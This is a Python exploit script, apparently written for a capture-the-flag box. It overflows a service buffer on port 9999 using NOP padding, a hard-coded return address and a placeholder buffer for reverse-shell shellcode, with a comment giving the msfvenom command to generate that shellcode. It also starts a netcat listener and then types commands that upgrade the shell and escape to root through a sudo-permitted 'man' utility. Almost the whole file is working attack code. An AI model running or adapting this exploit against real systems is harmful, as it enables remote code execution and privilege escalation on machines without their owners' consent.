#!/usr/bin/env python 

#
#You need to cahnge keyboard layout to en.
#
#Create a new shell code with that instruction above the previuosly set one with
#youre ip and deserved port
#

from time import sleep
import os, subprocess, socket, sys, pyautogui

def enter():
    pyautogui.press('enter')

def BufferOverflow():

    host = str(sys.argv[1])
    port = 9999

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    sleep(1)
    print(s.recv(1024))
    print("exploiting...." + "\n")

    #sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=6989  -f py -b "\x00"
    buf = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += "\x90\x90\x90\x90"

    #BadChars: \x00
    #RetAddress: 0x311712f3
    buffer = '\x90' * 524
    buffer += '\xf3\x12\x17\x31'
    buffer += '\x90' * 8
    buffer += buf

    print(":".join("{:02x}".format(ord(c)) for c in buffer))

    sleep(1)
    s.send(buffer)
    sleep(1)

    s.close()

pid = os.fork()

if pid > 0:
    os.system("nc -lvnp 6989")

elif pid == 0:

    subprocess.call("clear")
    BufferOverflow()        

    pyautogui.write("id")
    enter()

    pyautogui.write("script /dev/null -c bash")
    enter()

    pyautogui.write("sudo /home/anansi/bin/anansi_util manual man")
    enter()

    pyautogui.write("!")
    enter()

    pyautogui.write("id")
    enter()

else:
    print("Error")
